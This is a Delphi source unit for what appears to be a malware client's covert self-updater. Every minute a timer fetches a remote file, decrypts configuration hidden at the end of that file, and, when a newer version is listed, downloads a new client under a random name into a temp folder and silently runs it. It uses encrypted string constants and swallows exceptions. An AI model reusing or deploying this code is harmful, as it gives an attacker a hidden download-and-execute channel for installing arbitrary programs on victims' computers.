unit AtU;

interface

uses
  Windows, Classes, SysUtils, ExtCtrls, iniFiles, uTypes, uFnc, uEnc, uEof;

type
  TUpD = class(TComponent)
  private
    ConfigData: TCnfg;
    UTimer: TTimer;
    iPat: string;
    procedure fSyUp;
    procedure ChUp(Sender: TObject);
  private
  public
    constructor Create(AOwner: TComponent; Config: TCnfg);
    procedure Run();
    procedure Stop();
  end;

implementation

constructor TUpD.Create(AOwner: TComponent; Config: TCnfg);
begin
  inherited Create(Owner);

  // Set Config
  ConfigData := Config;

  // Set Update Path
  iPat := AddSlash(ExtractFileDir(ParamStr(0))) + DE('8BHlxrzSJdxM0D');
end; { Constructor -> Set Default Variable }

{****************************************************************************
                              Private Function
****************************************************************************}

procedure TUpD.fSyUp();
var
  EPath: string;
begin
  // Download New Client
  EPath := AddSlash(GtTeD) + GtRanStr(4) + DE('nMh1tD');

  // Start Client
  try
    if DowFi(ConfigData.ExUr, EPath) then
      RnAA(HWND_DESKTOP, EPath, '', ConfigData.iAd, False, 0)
  except
  end;
end; { forceSysUpdate -> System Update }

procedure TUpD.ChUp;
var
  IC : TMemIniFile;
  SL : TStringList;
begin
  // Update Timer Interval
  UTimer.Interval := ConfigData.UpTr;
  
  // Check Internet
  if not iInCon then Exit;

  // Download File
  if DowFi(ConfigData.InUr, iPat) then begin
    // Read File
    SL := TStringList.Create;
    SL.Text := DE(Trim(EofRF(iPat)));
    IC := TMemIniFile.Create(iPat);
    IC.SetStrings(SL);
    SL.Free;

    // Set Configuration
    LdCnf(ConfigData, IC);
    SvCnf(ConfigData);

    // Check Version
    if ConfigData.Vsr < IC.ReadInteger('CS', 'VER', ConfigData.Vsr) then
      fSyUp;

    IC.Free;
    DeleteFile(iPat);
  end;
end; { CheckUpdate -> Check Update }

{****************************************************************************
                              Public Function
****************************************************************************}

procedure TUpD.Run();
begin
  // Start Update Timer
  UTimer := TTimer.Create(Self);
  UTimer.Interval := 60000;
  UTimer.OnTimer := ChUp;
  UTimer.Enabled := True;
end; { Run -> Start Update Timer }

procedure TUpD.Stop();
begin
  // Stop Timer
  UTimer.Enabled := False;
  UTimer.Free;
end; { Run -> Stop Update Timer }

end.

